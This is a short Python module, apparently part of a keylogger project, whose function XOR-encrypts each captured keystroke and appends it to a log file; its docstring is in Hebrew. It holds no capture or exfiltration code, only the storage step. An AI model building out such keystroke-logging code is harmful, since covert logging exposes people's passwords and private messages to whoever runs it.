# write.py
from encryptor import xor_encrypt_decrypt
from config import LOG_FILE


def write_keystroke(key: str):
    """מצפין ושומר את ההקשה לקובץ"""
    encrypted_key = xor_encrypt_decrypt(key)

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(encrypted_key + "\n")
